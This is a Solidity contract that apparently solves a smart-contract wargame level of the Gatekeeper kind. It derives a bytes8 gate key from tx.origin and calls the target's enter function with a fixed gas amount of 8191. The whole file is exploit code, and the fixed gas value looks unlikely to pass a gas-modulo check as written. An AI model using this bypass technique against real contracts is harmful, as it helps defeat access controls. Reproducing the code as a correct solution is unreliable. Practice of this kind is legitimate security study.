// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperAttacker {
    address public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function attack() external {
        uint16 userKey = uint16(uint160(tx.origin));
        uint64 gateKey = (uint64(1) << 32) | uint64(userKey);
        bytes8 gateKeyBytes = bytes8(gateKey);

        (bool success, ) = instance.call{gas: 8191}(abi.encodeWithSignature("enter(bytes8)", gateKeyBytes));
        require(success, "Enter failed");
    }
}